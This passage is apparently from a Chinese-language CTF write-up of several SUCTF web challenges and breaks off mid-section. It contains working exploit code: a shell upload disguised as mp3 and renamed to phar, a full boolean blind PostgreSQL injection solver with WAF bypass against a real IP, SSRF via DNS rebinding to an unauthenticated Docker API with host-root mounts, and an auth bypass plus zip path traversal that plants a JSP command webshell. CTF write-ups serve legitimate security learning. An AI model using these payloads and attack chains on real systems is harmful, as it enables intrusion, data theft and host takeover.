        "imgFile": ("shell.mp3", shell, "audio/mpeg"),
    }
    r = session.post(
        url,
        data=data,
        files=files,
        headers={"User-Agent": USER_AGENT},
        timeout=20,
    )
    r.raise_for_status()
    resp = r.json()
    print(f"[+] upload response: {resp}", flush=True)
    if int(resp.get("status", -1)) != 3:
        raise RuntimeError("upload failed")
    return resp["data"]["FileName"]

def rename_to_phar(session, old_name):
    url = f"{TARGET}/index.php/Admin/Resource/changeFileName"
    data = {
        "DataSource": "1",
        "CurrentDir": "./Upload/",
        "OldFileName": old_name,
        "NewFileName": "shell.phar",
    }
    r = session.post(
        url,
        data=data,
        headers={"User-Agent": USER_AGENT, "X-Requested-With": "XMLHttpRequest"},
        timeout=15,
    )
    r.raise_for_status()
    resp = r.json()
    print(f"[+] rename response: {resp}", flush=True)
    if int(resp.get("status", -1)) != 1:
        raise RuntimeError("rename failed")
    return "/Upload/shell.phar"

def run_cmd(path, cmd):
    url = f"{TARGET}{path}"
    r = requests.get(url, params={"c": cmd}, headers={"User-Agent": USER_AGENT}, timeout=15)
    r.raise_for_status()
    return r.text

def main():
    parser = argparse.ArgumentParser(description="Exploit SU_cmsAgain")
    parser.add_argument("--captcha", default="", help="admin captcha if required")
    parser.add_argument(
        "--admin-password",
        default="",
        help="skip SQLi extraction and use this known admin password directly",
    )
    args = parser.parse_args()

    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT})

    if args.admin_password:
        admin_password = args.admin_password
        print(f"[+] using provided admin password: {admin_password}", flush=True)
    else:
        print("[*] extracting admin password via SQLi", flush=True)
        admin_password = sqli_extract_string(
            s, "SELECT AdminPassword FROM youdian_admin LIMIT 1"
        )
        print(f"[+] admin password = {admin_password}", flush=True)

    print("[*] logging into admin", flush=True)
    login_admin(s, admin_password, args.captcha)

    print("[*] enabling phar upload", flush=True)
    enable_phar_upload(s)

    print("[*] uploading shell as mp3", flush=True)
    old_name = upload_shell_as_mp3(s)

    print("[*] renaming shell to phar", flush=True)
    path = rename_to_phar(s, old_name)

    print("[*] testing RCE", flush=True)
    print(run_cmd(path, "id").strip(), flush=True)

    print("[*] reading flag", flush=True)
    flag = run_cmd(path, f"cat {FLAG_PATH}")
    print(flag.strip(), flush=True)

if __name__ == "__main__":
    main()
```

## SU_sqli

打开页面只有一个搜索框，但它要求有效签名才能查询，因此这题分两部分：

1. 复现前端签名，才能正常请求 /api/query
2. 在 q 参数处利用 SQL 注入拿到 flag

接口与前端流程分析

  查看前端静态资源：

- /static/app.js
- /static/wasm_exec.js
- /static/crypto1.wasm
- /static/crypto2.wasm
  -  app.js 中的真实请求流程是：

1. GET /api/sign 获取签名材料：
   1. nonce、ts、seed、salt（以及 algo）
2. 加载两个 Go WASM（crypto1.wasm、crypto2.wasm）
3. WASM 初始化后会在全局导出两个函数：
   1. __suPrep(...)
   2. __suFinish(...)
4. 构造签名后发送：
   1. POST /api/query
   2. JSON body：{"q": "...", "nonce": "...", "ts": ..., "sign": "..."}
      -   结论：不复现签名，就无法对 /api/query 做有效测试与注入。

复现签名

核心思路：

1. 在 Node 环境中加载 wasm_exec.js
2. 实例化 crypto1.wasm 与 crypto2.wasm
3. 调用 __suPrep/__suFinish 得到签名所需的中间值与最终 sign
4. 按前端 app.js 里的同样逻辑进行两段纯 JS 处理：
   1. unscramble(pre, nonce, ts)
   2. mixSecret(buf, probe, ts)
5. 最终发出带 sign 的 POST /api/query

确认 SQL 注入点

  签名复现后，测试 q 参数：

- 输入单引号 ' 会出现 PostgreSQL 报错（题目附件 wp 中也给出示例）：
  - ERROR: unterminated quoted string at or near "' LIMIT 20"
    -   说明：

1. 后端数据库是 PostgreSQL
2. q 被拼接进 SQL，存在注入可能
   1.  但直接使用经典 payload：
   2.  test' OR '1'='1
   3.  会返回 blocked，说明存在黑名单/WAF。

注入形态：字符串上下文 + LIKE 搜索

  根据返回行为推测后端类似：

  ... WHERE content LIKE '%<q>%' LIMIT 20

  q 在字符串上下文，并且 WAF 会拦截明显的 OR、注释等。

  因此采用字符串拼接 + CASE WHEN 构造布尔盲注（无需 OR、无需注释）：

  '||CASE WHEN <condition> THEN '' ELSE 'zzzzz_not_found_zzzzz' END||'

  原理：

- <condition> 为真：拼接结果不会引入明显的“不存在关键字”，容易返回结果（data 非空）
- <condition> 为假：拼接出一个极难命中的串 zzzzz_not_found_zzzzz，导致无结果（data 为空）
- 于是我们得到一个稳定的布尔回显通道：看 /api/query 返回的 data 是否为空判断真假
  -  这就是本题的核心：布尔盲注（Boolean-based Blind SQLi）。

验证盲注可用

  利用布尔盲注逐字符提取文本常用判断：

- 长度判断：length(expr) >= pos
- 字符判断：ascii(substr(expr,pos,1)) > mid（二分加速）

绕过黑名单：分割敏感表名

  WAF 会拦截敏感单词（如 secrets）。绕过方式是字符串拼接：

  'sec'||'rets'

  这样 SQL 最终仍会解析为 secrets，但基于关键字匹配的过滤往往绕过。

使用 PostgreSQL XML 技巧提取 flag

  直接枚举 secrets 表有时噪声大或更容易触发过滤。可以用 PostgreSQL 的 XML 函数把查询结果转成 XML，再用 XPath 取出 flag

  字段文本：

1. 转 XML：
   1.  query_to_xml('select flag from sec'||'rets', true, true, '')
2. XPath 提取并拼成字符串
   1.  得到一个“纯文本表达式”后，再用布尔盲注的 ascii(substr(...)) 逐位取出完整 flag。

  直接运行脚本：

```Python
#!/usr/bin/env python3
import json
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
from pathlib import Path

BASE = "http://101.245.108.250:10001"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36"
)
TZ = "Asia/Shanghai"
BRANDS = ""
INTL = "1"
WD = "0"
FALSE_MARK = "zzzzz_not_found_zzzzz"
SLEEP = 0.08

NODE_HELPER = r"""
import fs from "node:fs/promises";
import process from "node:process";
import vm from "node:vm";

const BASE = process.argv[2];
const Q = process.argv[3] || "a";
const ASSET_DIR = process.argv[4];
const UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
  "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
const TZ = "Asia/Shanghai";
const BRANDS = "";
const INTL = "1";
const WD = "0";
const DEFAULT_PROBE = `wd=${WD};tz=${TZ};b=${BRANDS};intl=${INTL}`;

function b64UrlToBytes(s) {
  let t = s.replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4) t += "=";
  return Buffer.from(t, "base64");
}

function bytesToB64Url(bytes) {
  return Buffer.from(bytes)
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/g, "");
}

function rotl32(x, r) {
  return ((x << r) | (x >>> (32 - r))) >>> 0;
}

function rotr32(x, r) {
  return ((x >>> r) | (x << (32 - r))) >>> 0;
}

const rotScr = [1, 5, 9, 13, 17, 3, 11, 19];

function maskBytes(nonceB64, ts) {
  const nb = b64UrlToBytes(nonceB64);
  let s = 0 >>> 0;
  for (const b of nb) {
    s = (Math.imul(s, 131) + b) >>> 0;
  }
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = Buffer.alloc(32);
  for (let i = 0; i < 32; i++) {
    s ^= (s << 13) >>> 0;
    s ^= s >>> 17;
    s ^= (s << 5) >>> 0;
    out[i] = s & 0xff;
  }
  return out;
}

function unscramble(pre, nonceB64, ts) {
  const buf = Buffer.from(b64UrlToBytes(pre));
  if (buf.length !== 32) throw new Error("prep");
  for (let i = 0; i < 8; i++) {
    const o = i * 4;
    let w =
      (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
    w = rotr32(w, rotScr[i]);
    buf[o] = w & 0xff;
    buf[o + 1] = (w >>> 8) & 0xff;
    buf[o + 2] = (w >>> 16) & 0xff;
    buf[o + 3] = (w >>> 24) & 0xff;
  }
  const mask = maskBytes(nonceB64, ts);
  for (let i = 0; i < 32; i++) buf[i] ^= mask[i];
  return buf;
}

function probeMask(probe, ts) {
  let s = 0 >>> 0;
  for (let i = 0; i < probe.length; i++) {
    s = (Math.imul(s, 33) + probe.charCodeAt(i)) >>> 0;
  }
  const hi = Math.floor(ts / 0x100000000);
  s = (s ^ (ts >>> 0) ^ (hi >>> 0)) >>> 0;
  const out = Buffer.alloc(32);
  for (let i = 0; i < 32; i++) {
    s = (Math.imul(s, 1103515245) + 12345) >>> 0;
    out[i] = (s >>> 16) & 0xff;
  }
  return out;
}

function mixSecret(buf, probe, ts) {
  const out = Buffer.from(buf);
  const mask = probeMask(probe, ts);
  if (mask[0] & 1) {
    for (let i = 0; i < 32; i += 2) {
      const t = out[i];
      out[i] = out[i + 1];
      out[i + 1] = t;
    }
  }
  if (mask[1] & 2) {
    for (let i = 0; i < 8; i++) {
      const o = i * 4;
      let w =
        (out[o] | (out[o + 1] << 8) | (out[o + 2] << 16) | (out[o + 3] << 24)) >>> 0;
      w = rotl32(w, 3);
      out[o] = w & 0xff;
      out[o + 1] = (w >>> 8) & 0xff;
      out[o + 2] = (w >>> 16) & 0xff;
      out[o + 3] = (w >>> 24) & 0xff;
    }
  }
  for (let i = 0; i < 32; i++) out[i] ^= mask[i];
  return out;
}

async function loadGoRuntime() {
  const code = await fs.readFile(`${ASSET_DIR}/wasm_exec.js`, "utf8");
  vm.runInThisContext(code, { filename: "wasm_exec.js" });
}

async function loadWasm() {
  await loadGoRuntime();

  const go1 = new globalThis.Go();
  const wasm1 = await fs.readFile(`${ASSET_DIR}/crypto1.wasm`);
  const { instance: inst1 } = await WebAssembly.instantiate(wasm1, go1.importObject);
  go1.run(inst1);

  const go2 = new globalThis.Go();
  const wasm2 = await fs.readFile(`${ASSET_DIR}/crypto2.wasm`);
  const { instance: inst2 } = await WebAssembly.instantiate(wasm2, go2.importObject);
  go2.run(inst2);

  for (let i = 0; i < 200; i++) {
    if (
      typeof globalThis.__suPrep === "function" &&
      typeof globalThis.__suFinish === "function"
    ) {
      return;
    }
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("wasm init");
}

async function getSignMaterial() {
  const res = await fetch(`${BASE}/api/sign`, {
    headers: { "User-Agent": UA },
  });
  return res.json();
}

async function query(q, probe = DEFAULT_PROBE) {
  const signMaterial = await getSignMaterial();
  if (!signMaterial.ok) throw new Error(JSON.stringify(signMaterial));
  const material = signMaterial.data;

  const pre = globalThis.__suPrep(
    "POST",
    "/api/query",
    q,
    material.nonce,
    String(material.ts),
    material.seed,
    material.salt,
    UA,
    probe
  );

  const secret2 = unscramble(pre, material.nonce, material.ts);
  const mixed = mixSecret(secret2, probe, material.ts);
  const sign = globalThis.__suFinish(
    "POST",
    "/api/query",
    q,
    material.nonce,
    String(material.ts),
    bytesToB64Url(mixed),
    probe
  );

  const res = await fetch(`${BASE}/api/query`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": UA,
    },
    body: JSON.stringify({
      q,
      nonce: material.nonce,
      ts: material.ts,
      sign,
    }),
  });

  const text = await res.text();
  console.log(
    JSON.stringify({
      status: res.status,
      response: text,
    })
  );
}

loadWasm()
  .then(() => query(Q))
  .catch((err) => {
    console.error(String(err && err.stack ? err.stack : err));
    process.exit(1);
  });
"""

def require_node():
    if shutil.which("node") is None:
        raise SystemExit("node is required to run this solve script")

def download(url: str, dst: Path) -> None:
    if dst.exists():
        return
    with urllib.request.urlopen(url, timeout=20) as resp:
        dst.write_bytes(resp.read())

def ensure_assets(root: Path) -> Path:
    asset_dir = root / ".assets"
    asset_dir.mkdir(parents=True, exist_ok=True)
    download(f"{BASE}/static/wasm_exec.js", asset_dir / "wasm_exec.js")
    download(f"{BASE}/static/crypto1.wasm", asset_dir / "crypto1.wasm")
    download(f"{BASE}/static/crypto2.wasm", asset_dir / "crypto2.wasm")
    return asset_dir

def build_node_helper(tmpdir: Path) -> Path:
    helper = tmpdir / "helper.mjs"
    helper.write_text(NODE_HELPER, encoding="utf-8")
    return helper

def run_query(helper: Path, asset_dir: Path, q: str) -> dict:
    cmd = ["node", str(helper), BASE, q, str(asset_dir)]
    proc = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr.strip() or "node helper failed")
    try:
        return json.loads(proc.stdout)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"bad helper output: {proc.stdout!r}") from exc

def payload_for(condition: str) -> str:
    return f"'||CASE WHEN {condition} THEN '' ELSE '{FALSE_MARK}' END||'"

class Exploit:
    def __init__(self, helper: Path, asset_dir: Path):
        self.helper = helper
        self.asset_dir = asset_dir

    def query(self, q: str) -> dict:
        data = run_query(self.helper, self.asset_dir, q)
        body = json.loads(data["response"])
        if not body.get("ok"):
            raise RuntimeError(body.get("error", data["response"]))
        return body

    def probe(self, condition: str) -> bool:
        body = self.query(payload_for(condition))
        return bool(body.get("data"))

    def extract_text(self, expr: str, max_len: int = 128) -> str:
        out = []
        for pos in range(1, max_len + 1):
            if not self.probe(f"length({expr})>={pos}"):
                break
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                cond = f"ascii(substr({expr},{pos},1))>{mid}"
                if self.probe(cond):
                    lo = mid + 1
                else:
                    hi = mid
                time.sleep(SLEEP)
            out.append(chr(lo))
            current = "".join(out)
            print(f"[{pos}] {current}")
            time.sleep(SLEEP)
        return "".join(out)

def main() -> int:
    require_node()
    root = Path(__file__).resolve().parent
    asset_dir = ensure_assets(root)

    with tempfile.TemporaryDirectory(prefix="su_sqli_") as td:
        helper = build_node_helper(Path(td))
        exp = Exploit(helper, asset_dir)

        print("[*] current_database()")
        current_db = exp.extract_text("(SELECT current_database())", 16)
        print(f"[+] database = {current_db}")

        print("[*] public tables")
        tables = exp.extract_text(
            "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')",
            64,
        )
        print(f"[+] tables = {tables}")

        flag_expr = (
            "array_to_string("
            "xpath('/x/row/flag/text()',"
            "xmlelement(name x,query_to_xml('select flag from sec'||'rets',true,true,''))"
            "),',')"
        )
        print("[*] extracting flag")
        flag = exp.extract_text(flag_expr, 96)
        print(f"[+] flag = {flag}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```

## SU_uri

这题真正的利用链不是一条普通的 SSRF，也不是我一开始打到的那套 `SU Query`。  正确方向是:

1. `10011` 上的 webhook 存在 SSRF
2. 过滤逻辑存在 DNS TOCTOU，可以用 rebinding 打进 `127.0.0.1`
3. 本地 `127.0.0.1:2375` 暴露了未鉴权 Docker API
4. 通过 Docker API 起容器，挂载宿主目录，执行宿主机 `/readflag`
5. 通过 Docker `attach` 拿 stdout，得到真实 flag

下面按完整过程展开。

**入口分析**

访问首页后，看到的是一个非常简单的 webhook 调试面板。

首页源码里最关键的逻辑是：

```JavaScript
const resp = await fetch('/api/webhook', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ url, body })
});
```

也就是说，后端会接收两个字段：

- `url`
- `body`

然后替我们向 `url` 发一个请求。

这基本可以直接判定题目核心是 SSRF。

**确认 SSRF 行为**

直接发一个正常请求到外部站点，可以确认行为：

- 服务端发起的是 `POST`
- `body` 会被作为请求体发出
- 目标响应内容会被原样带回

例如，打 `https://httpbin.org/anything` 时，可以看到返回中有：

- `method = POST`
- `User-Agent = Go-http-client/2.0`
- `origin = 101.245.108.250`

说明确实是服务端在请求，不是前端。

**过滤逻辑初探**

接着尝试几个经典本地地址：

- `http://127.0.0.1:10011/`
- `http://localhost:10011/`
- `http://[::1]:10011/`
- `http://172.17.0.1/`
- `http://169.254.169.254/`

都被明确拦截了，返回类似：

{"message":"blocked IP: 127.0.0.1"}

或者：

{"message":"blocked host: localhost"}

所以不是“裸奔 SSRF”，而是做了地址过滤。

但这里有一个非常重要的细节：

- 它会先解析域名
- 然后校验“这个域名现在解析出来的 IP 是否安全”
- 再真正发起请求

如果“校验使用的解析结果”和“最终连接使用的解析结果”不是同一次，就存在 DNS rebinding / TOCTOU 绕过空间。

**误入歧途但有价值的支线：SU Query**

在对同机公网 IP 邻近端口做 SSRF 探测时，我发现：

- `10001`
- `10002`
- `10003`

这几个端口上不是 `CloudHook`，而是一套叫 `SU Query` 的服务。

它的前端资源里有：

- `/static/app.js`
- `/static/wasm_exec.js`
- `/static/crypto1.wasm`
- `/static/crypto2.wasm`

前端会请求：

- `/api/sign`
- `/api/query`

并通过两段 Go WASM 导出的函数 `__suPrep` 和 `__suFinish` 生成签名。

我用 Playwright 模拟正常 Chrome 指纹后，成功复现了签名流程，并确认：

- `q` 参数存在 PostgreSQL 注入
- `or / and / union / -- / /*` 这类关键字有一个很弱的黑名单 WAF
- 但依然可以用字符串拼接形式构造盲注：

```
'||(case when CONDITION then 'x' else '' end)||'
```

之后盲出了一张 `secrets` 表，并得到：

```HTTP
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```

但是这个 flag 提交不对。

这一步很关键，因为它说明：

- 同一台机器上确实挂了别的题目或诱饵服务
- 不能看到 `SUCTF{...}` 就直接交
- 必须回到 `10011` 自身，继续打真正的 webhook 题点

**确认 DNS rebinding 可用**

我使用了公开的 rebinding 域名服务 `1u.ms` 来测试 TOCTOU。

有效 payload 形式如下：

http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms:2375/

它的含义是：

- 第一次解析给一个“看起来安全”的公网 IP，例如 `1.1.1.1`
- 后续解析切换为 `127.0.0.1`

这个 payload 多次请求后，出现了三种不同结果：

1. 过滤阶段就命中 `127.0.0.1`，被拦截
2. 最终请求打到首跳公网地址，连接失败
3. 成功打到本地真实服务

这说明过滤逻辑确实有 TOCTOU。

更直接的证据是，我最终成功通过 rebinding 打到了：

- `127.0.0.1:8080`
- `127.0.0.1:2375`

其中：

- `127.0.0.1:8080` 返回的是当前 `CloudHook` 自身页面
- `127.0.0.1:2375` 返回的是 Docker API 的典型响应

**定位本地 Docker API**

对 `127.0.0.1:2375` 发起不同请求后，最关键的一条是：

请求：

```HTTP
POST /containers/create
```

返回：

```HTTP
{"message":"config cannot be empty in order to create a container"}
```

这基本就是 Docker Engine API 的标准报错。

因此可以确定：

- 本地回环口 `2375` 暴露了未鉴权 Docker Remote API
- 题目真正的危险点是：
  - 外部 webhook SSRF
  - 内部 Docker API

一旦拿到 Docker API，相当于能直接在宿主环境附近起容器执行命令。

**第一步拿到宿主** **`/flag`** **的提示信息**

我先创建了一个测试容器，把宿主根目录 `/` 挂到容器里 `/host`。

思路很简单：

- 用 `alpine` 镜像
- bind mount 宿主 `/` 到容器 `/host`
- 在容器里尝试读取 `/host/flag`

容器大意如下：

```Bash
{
  "Image": "alpine:latest",
  "Cmd": [
    "sh",
    "-c",
    "for f in /host/flag /host/root/flag /flag /root/flag; do if [ -f \"$f\" ]; then echo ===$f===; cat \"$f\"; fi; done"
  ],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}
```

然后通过 Docker 的 `attach` 接口把 stdout 拉回来。

拿到的内容是：

```HTTP
===/host/flag===
Flag is not here. executable /readflag to get it!
```

这一步非常关键。

说明：

- 宿主根目录确实有 `/flag`
- 但里面只是提示信息
- 真正的 flag 需要执行宿主机上的 `/readflag`

也就是说题目的最后一步不是“读文件”，而是“执行宿主程序”。

**执行宿主** **`/readflag`**

既然 Docker API 可控，那么最直接的做法就是：

- 再创建一个容器
- 继续把宿主 `/` bind 到容器 `/host`
- 容器启动后直接执行 `/host/readflag`

对应的容器配置大意如下：

```HTTP
{
  "Image": "alpine:latest",
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": false,
  "Cmd": ["sh", "-c", "/host/readflag"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}
```

然后按顺序做三步：

1. `POST /containers/create`
2. `POST /containers/<name>/start`
3. `POST /containers/<name>/attach?logs=1&stdout=1&stderr=1&stream=0`

第三步 attach 返回的内容中，stdout 带回了真实 flag：

```HTTP
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

返回体前面还会混有 Docker attach 的 8 字节 stream header，例如：

\u0001\u0000\u0000\u0000...

把这部分忽略掉，只取后面的正文即可。

**为什么前面的假 flag 是错的**

这题最容易误判的地方，就是同机上还挂着另一套服务 `SU Query`。

那套服务本身也有明显漏洞：

- 签名逻辑可复现
- PostgreSQL 注入可打
- 能盲出一个看起来很像真 flag 的字符串：

```
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```

但它不是当前题 `SU_uri` 的答案。

从题目本身的命名也能看出来：

- `uri`
- `webhook`
- `attack vectors here`

更贴近的是 URL / SSRF / 内网访问这一套，而不是 SQL 注入。

所以真正解题时，遇到这种“同机挂多个服务”的环境，一定要判断：

- 当前题面到底在指向哪条链
- 拿到的 flag 是否和题目利用链匹配

**最终利用链总结**

整个正确解可以压缩成一句话：

> 利用 `10011` webhook 的 SSRF，通过 DNS rebinding 绕过 localhost 过滤，访问 `127.0.0.1:2375` 的未鉴权 Docker API，起容器挂载宿主根目录并执行 `/readflag`，最后通过 Docker attach 拿到真实 flag。

更细一点就是：

1. 发现 `/api/webhook` 会替用户对任意 URL 发 `POST`
2. 发现有 localhost/内网过滤
3. 验证过滤与实际连接之间存在 DNS TOCTOU
4. 用 `1u.ms` rebinding 把目标切到 `127.0.0.1`
5. 扫到本地 `2375` 是 Docker API
6. 通过 Docker API 创建容器并挂载宿主 `/`
7. 读 `/host/flag` 得到提示
8. 执行 `/host/readflag`
9. attach stdout，得到真 flag

**关键 payload 记录**

**rebinding 打本地 Docker API**

```HTTP
http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms:2375/
```

**确认 Docker API**

目标 URL：

```HTTP
http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms:2375/containers/create
```

转发 body：

```HTTP
{}
```

响应：

```HTTP
{"message":"config cannot be empty in order to create a container"}
```

读取宿主 `/flag`

创建容器时核心配置：

```JSON
{
  "Image": "alpine:latest",
  "Cmd": ["sh", "-c", "cat /host/flag"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}
```

**执行宿主** **`/readflag`**

创建容器时核心配置：

```JSON
{
  "Image": "alpine:latest",
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": false,
  "Cmd": ["sh", "-c", "/host/readflag"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}
```

**读取输出**

```HTTP
POST /containers/<name>/attach?logs=1&stdout=1&stderr=1&stream=0
```

脚本与本地文件

当前目录里保留了一个辅助脚本：

- solve.js

它最初用于：

- 自动化 `SU Query` 的签名
- 实现布尔盲注
- 辅助读取环境与文件

虽然最终正确 flag 不依赖 `SU Query`，但这个脚本在排查“假 flag”时很有用。

结论

这题本质是一个多阶段组合题：

- 第一阶段是 SSRF
- 第二阶段是 DNS rebinding / TOCTOU 绕过
- 第三阶段是 Docker API RCE
- 第四阶段是宿主机辅助程序 `/readflag`

所以最终正确 flag 为：

```HTTP
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

## SU_wms

**整体利用链**

这题不是单点漏洞，而是一条很标准的后台功能链：

1. `AuthInterceptor` 白名单判断有缺陷，可以通过 query string 子串绕过鉴权
2. 后台 `cgformTemplateController.do` 提供模板 zip 上传和解压功能
3. `templateCode` 可控且未做路径校验，导致目录穿越解压
4. 将恶意 JSP 解压到 WebRoot，拿到 RCE
5. 通过 RCE 搜索随机路径 flag，再用容器内异常的 SUID `date` 读出 root-only flag

**一、路由与框架基础**

从 `WEB-INF/web.xml` 可以看到：

- `*.do` 和 `*.action` 走普通 Spring MVC
- `/rest/*` 走 REST DispatcherServlet

所以全站大体可以分成两类：

- `xxx.do` 后台控制器
- `/rest/...` 风格控制器

对应文件：

- `jeewms_580e924/unpack/WEB-INF/web.xml`

**二、前台鉴权绕过**

**2.1 关键代码**

核心在这两个类：

- `org.jeecgframework.core.interceptors.AuthInterceptor`
- `org.jeecgframework.core.util.ResourceUtil`

逻辑可以简化为：

```Java
String requestPath = ResourceUtil.getRequestPath(request);
if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
    return true;
}
if (excludeUrls.contains(requestPath)) {
    return true;
}
if (moHuContain(excludeContainUrls, requestPath)) {
    return true;
}
```

其中 `ResourceUtil.getRequestPath()` 的行为是：

```Java
String queryString = request.getQueryString();
String requestPath = request.getRequestURI();
if (StringUtils.isNotEmpty(queryString)) {
    requestPath = requestPath + "?" + queryString;
}
if (requestPath.indexOf("&") > -1) {
    requestPath = requestPath.substring(0, requestPath.indexOf("&"));
}
requestPath = requestPath.substring(request.getContextPath().length() + 1);
```

这里有两个明显问题：

1. `requestPath` 会把整个 query string 拼进去
2. 只会在 `&` 处分割，不会在 `?` 处分割

**2.2 白名单配置**

`spring-mvc.xml` 中配置了：

```XML
<property name="excludeContainUrls">
    <list>
        <value>systemController/showOrDownByurl.do</value>
        <value>wmsApiController.do</value>
    </list>
</property>
```

也就是说，只要 `requestPath` 中包含：

- `systemController/showOrDownByurl.do`
- 或 `wmsApiController.do`

就会被直接放行。

**2.3 绕过方法**

因为白名单是 `contains()`，所以任意后台接口都可以把这个白名单片段塞进 query string 中，从而绕过鉴权。

例如：

```Plain
/jeewms/cgformTemplateController.do?uploadZip=systemController/showOrDownByurl.do
```

此时拦截器看到的 `requestPath` 大致是：

```Plain
cgformTemplateController.do?uploadZip=systemController/showOrDownByurl.do
```

它包含白名单子串，于是直接放行。

这个点非常关键，因为它把“后台模板上传接口”变成了“未登录可访问接口”。

**三、模板上传与目录穿越**

**3.1 目标控制器**

利用点在：

- `org.jeecgframework.web.cgform.controller.template.CgformTemplateController`

前端页面里也有相关入口：

- `cgformTemplateController.do?uploadZip`
- `cgformTemplateController.do?doAdd`

**3.2 zip 上传**

`uploadZip` 的行为：

```Java
File tempDir = new File(this.getUploadBasePath(request), "temp");
picTempFile = new File(
    tempDir.getAbsolutePath(),
    "/zip_" + request.getSession().getId() + "." + FileUtils.getExtend(file.getOriginalFilename())
);
FileCopyUtils.copy(file.getBytes(), picTempFile);
```

上传后的 zip 会被保存在：

```Plain
WEB-INF/classes/online/template/temp/zip_<JSESSIONID>.zip
```

**3.3 zip 解压**

`doAdd` 的关键逻辑：

```Java
String basePath = this.getUploadBasePath(request);
File templeDir = new File(basePath + File.separator + cgformTemplate.getTemplateCode());
if (!templeDir.exists()) {
    templeDir.mkdirs();
}
this.removeZipFile(
    basePath + File.separator + "temp" + File.separator + cgformTemplate.getTemplateZipName(),
    templeDir.getAbsolutePath()
);
```

然后：

```Java
private void removeZipFile(String zipFilePath, String templateDir) {
    this.unZipFiles(zipFile, templateDir);
}

private void unZipFiles(File zipFile, String descDir) throws IOException {
    ZipUtil.unzip(zipFile, new File(descDir));
}
```

问题很明确：

- `templateCode` 完全由用户控制
- 没有 `..` 检查
- 没有 canonical path 校验

**3.4 为何能逃到 WebRoot**

`getUploadBasePath()` 返回的是：

```Plain
/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template
```

如果传：

```Plain
templateCode=../../../../
```

路径会变成：

```Plain
/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template/../../../../
```

规范化后恰好落到：

```Plain
/usr/local/tomcat/webapps/jeewms
```

也就是应用根目录。

于是 zip 里的文件会被直接解压到 WebRoot。

**四、RCE 获取**

**4.1 先用静态文件验证**

在 zip 里放一个普通文本文件，比如：

```Plain
probe_cgtemplate.txt
```

走两步请求：

1. 上传 zip：

```Plain
POST /jeewms/cgformTemplateController.do?uploadZip=systemController/showOrDownByurl.do
```

1. 解压到根目录：

```Plain
POST /jeewms/cgformTemplateController.do?doAdd=systemController/showOrDownByurl.do
templateCode=../../../../
templateZipName=zip_<JSESSIONID>.zip
```

然后访问：

```Plain
/jeewms/probe_cgtemplate.txt
```

能正常返回内容，说明任意写 WebRoot 已成立。

**4.2 写入 JSP**

接着把 zip 中的文件改成 JSP，例如：

```Java
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd == null) cmd = "id";
Process p = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start();
BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = r.readLine()) != null) {
    out.println(line + "<br/>");
}
r.close();
%>
```

同样上传并解压后，访问：

```Plain
/jeewms/cmd.jsp?cmd=id
```

返回：

```Plain
uid=999(wms) gid=999(wms) groups=999(wms)
```

说明 RCE 已经打通。

**五、flag 搜索**

**5.1 从 Dockerfile 判断 flag 位置**

题目给了 Dockerfile，里面有：

```Dockerfile
COPY flag /tmp/flag
RUN set -eux; \
    FLAG_DIR="$(cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-12)"; \
    FLAG_NAME="flag_$(cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-8)"; \
    mkdir -p "/${FLAG_DIR}"; \
    mv /tmp/flag "/${FLAG_DIR}/${FLAG_NAME}"
```

因此可以确定：

- flag 放在 `/` 下一层随机目录中
- 文件名固定前缀为 `flag_`

**5.2 直接搜**

用 webshell 执行：

```Bash
find / -name 'flag_*' 2>/dev/null
```

远程实测找到：

```Plain
/30b5a132adc9/flag_2d630fb4
```

**六、为什么直接读不出来**

如果直接 `cat` 或在 JSP 里 `FileReader` 打开，会报：

```Plain
Permission denied
```

进一步看权限：

```Bash
ls -l /30b5a132adc9/flag_2d630fb4
```

返回：

```Plain
-r-------- 1 root root ...
```

而 webshell 身份是：

```Plain
uid=999(wms)
```

所以单纯有 RCE 还不够，需要继续利用容器环境里的额外错误配置。

**七、SUID date 读 flag**

